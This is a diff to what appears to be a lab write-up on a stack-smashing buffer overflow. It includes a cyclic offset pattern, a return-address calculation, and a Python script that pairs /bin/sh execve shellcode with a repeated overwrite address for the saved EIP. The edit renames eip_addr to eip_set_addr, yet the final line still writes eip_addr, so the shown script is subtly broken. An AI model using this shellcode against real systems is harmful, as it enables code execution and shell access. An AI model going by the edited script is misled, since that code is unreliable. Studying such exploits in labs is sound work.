@@ -137,7 +137,7 @@ Buffer injection :
 # https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection
 import sys
 shellcode = b""
-eip_addr = b"
+eip_set_addr = b"
 pattern  = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
 sys.stdout.buffer.write(pattern)
 
@@ -178,11 +178,13 @@ Now this part we will calculate our entry point address for our shell code.
 
 `ffffcd98−0x2c` = `FFFFCD6C`
 
-Now we can pass our shellcode with our eip address and stack smash.
+Now we can pass our shellcode with our eip address and stack smash. This allows us on the function call back to return to an other address which we defined ourselves, which points to our defined shellcode. Since our system is in little endian, we are writing our bytes like so.
 ```python
 # https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection
 import sys
 shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
-eip_addr = b"\x6c\xcd\xff\xff"
-sys.stdout.buffer.write(shellcode + 30*eip_addr)
+eip_set_addr = b"\x6c\xcd\xff\xff"
+sys.stdout.buffer.write(shellcode + 30*eip_addr) # inserting our shell code and overwriting the stack saved EIP.
 ```
+Running shellcode from buffer stack smashing.
+![alt text](image-2.png)
